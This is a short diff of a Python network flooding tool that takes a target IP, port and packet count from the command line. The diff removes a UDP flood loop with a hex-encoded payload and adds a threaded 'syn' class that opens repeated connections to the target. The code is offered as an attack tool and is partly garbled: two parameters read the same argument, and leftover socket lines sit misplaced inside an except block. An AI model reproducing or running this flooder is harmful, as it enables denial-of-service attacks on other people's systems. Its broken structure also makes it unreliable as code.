@@ -14,13 +14,21 @@ port = int(sys.argv[2])
 size = int(sys.argv[3])
 packets = int(sys.argv[3])
 sent = 0
-data = 'f1a525da11f6'.decode('hex')
-while True:
-        try:
-                if time.time() > timeout:
-                        break
-                else:
-                        pass
+
+class syn(threading.Thread):
+    def __init__(self, ip, port, packets):
+        self.ip = ip
+        self.port = port
+        self.packets = packets
+        self.syn = socket.socket()
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
+            try:
+                self.syn.connect((self.ip, self.port))
+            except:
+                pass
+                
                 udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                 syn = socket.socket()
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
